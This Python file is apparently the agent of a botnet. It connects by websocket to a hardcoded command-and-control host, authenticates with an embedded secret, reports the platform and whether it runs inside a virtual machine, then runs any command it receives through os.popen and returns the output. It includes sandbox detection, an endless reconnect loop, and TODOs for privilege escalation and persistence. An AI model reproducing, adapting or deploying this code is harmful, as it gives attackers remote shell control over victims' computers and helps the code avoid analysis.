import websockets
import asyncio
import json
import os
import traceback
import sys

debugMode = True


def debug(*args):
    if debugMode:
        print(*args)


"""{
  "uuid": "fe09423a-c414-4c09-b46c-2325296e692b",
  "secret": "$2b$12$FTqBjEvWXERvhNmOoOODIutaJTerdvWQklMeS4luKbMbShHYL.TDi",
  "name": "test",
  "version": 0,
  "created_at": 1702496610,
  "last_seen": 1702496610,
  "raw_secret": "cxUjBjwDaBDiCQk3l9AW9BT4UE5ROK6fEpxL1qVQkxQ"
}"""


UUID = "fe09423a-c414-4c09-b46c-2325296e692b"

WS_URL = f"ws://api.botnet.alecj.tk:18000/agent/{UUID}/ws"

# deepcode ignore HardcodedNonCryptoSecret: this is purely for testing
SECRET = "cxUjBjwDaBDiCQk3l9AW9BT4UE5ROK6fEpxL1qVQkxQ"

# TODO: gain root/administrator access

# TODO: establish persistence

# check if running in a VM
IS_VM = False

environment = [key for key in os.environ if 'VBOX' in key]
processes = [line.split()[0 if os.name == 'nt' else -1] for line in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if line.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
if len(environment) > 0 or len(processes) > 0:
    IS_VM = True


async def main():
    while True:
        try:
            async for ws in websockets.connect(WS_URL):
                # Send authentication
                await ws.send(json.dumps({
                    "secret": SECRET,
                    "platform": sys.platform,
                    "architecture": sys.maxsize > 2 ** 32 and "64bit" or "32bit",
                    "vm": IS_VM
                }))
                res = await ws.recv()
                res = json.loads(res)
                debug(res)
                if res.get("status") != '200':
                    raise Exception("Authentication failed")

                while True:
                    res = await ws.recv()
                    res = json.loads(res)
                    debug("recv: " + str(res))

                    if res.get("limitations") is not None:
                        if sys.platform in ['win32', 'darwin', 'linux', 'linux2']:
                            if sys.platform in res.get("limitations"):
                                await ws.send(json.dumps({
                                    "status": 403,
                                    "error": "Command not run because limitations are set"
                                }))
                                continue

                        if 'no-vm' in res.get("limitations"):
                            if IS_VM:
                                await ws.send(json.dumps({
                                    "status": 403,
                                    "error": "Command not run because limitations are set"
                                }))
                                continue

                    output = os.popen(res.get("command")).read()
                    debug(output)

                    await ws.send(json.dumps({
                        "status": 200,
                        "output": output
                    }))

        except Exception as e:
            debug(traceback.format_exc())
            await asyncio.sleep(5)

while True:
    asyncio.run(main())
